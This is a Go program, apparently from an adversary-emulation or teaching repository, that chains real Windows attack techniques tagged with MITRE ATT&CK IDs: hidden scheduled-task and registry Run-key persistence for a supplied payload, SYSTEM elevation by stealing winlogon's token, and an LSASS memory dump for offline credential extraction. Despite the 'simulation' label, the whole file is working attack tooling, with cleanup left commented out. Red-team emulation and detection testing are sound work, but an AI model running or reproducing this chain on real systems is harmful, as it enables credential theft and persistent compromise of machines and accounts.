// cmd/sim demonstrates composing offensive techniques into a single
// end-to-end simulation using pkg/sim.
//
// Build:  GOOS=windows GOARCH=amd64 go build -o sim.exe ./cmd/sim
// Usage:  sim.exe <payload-path> <lsass-dump-path>
//
// Requires elevated cmd for the token theft + LSASS dump steps.
package main

import (
	"log"
	"os"

	"github.com/rankin2000/golangexamples/pkg/creds"
	"github.com/rankin2000/golangexamples/pkg/persistence"
	"github.com/rankin2000/golangexamples/pkg/sim"
	"github.com/rankin2000/golangexamples/pkg/tokens"
)

func main() {
	if len(os.Args) < 3 {
		log.Fatalf("usage: %s <payload-path> <lsass-dump-path>", os.Args[0])
	}
	payload := os.Args[1]
	dumpPath := os.Args[2]

	s := sim.New().
		// T1053.005 - persistence via scheduled task (XML variant for hidden flag)
		Add(&persistence.SchTask{
			PayloadPath: payload,
			UseXML:      true,
		}).
		// T1547.001 - belt-and-suspenders persistence in HKCU Run
		Add(&persistence.RegistryRunKey{
			Hive:        persistence.HKCU,
			PayloadPath: payload,
		}).
		// T1134.001 - elevate to SYSTEM by stealing winlogon's token
		Add(&tokens.Steal{
			TargetExe:     "winlogon.exe",
			SpawnExe:      `C:\Windows\System32\cmd.exe`,
			EnableSeDebug: true,
		}).
		// T1003.001 - dump lsass for offline credential extraction
		Add(&creds.LSASSDump{
			OutputPath:    dumpPath,
			EnableSeDebug: true,
		})

	log.Println("plan:")
	for _, p := range s.Plan() {
		log.Println("  -", p)
	}

	if err := s.Run(); err != nil {
		log.Fatalf("[-] %v", err)
	}
	log.Println("[+] simulation complete")

	// Uncomment to revert persistence after the run:
	// if err := s.Cleanup(); err != nil { log.Println("cleanup:", err) }
}
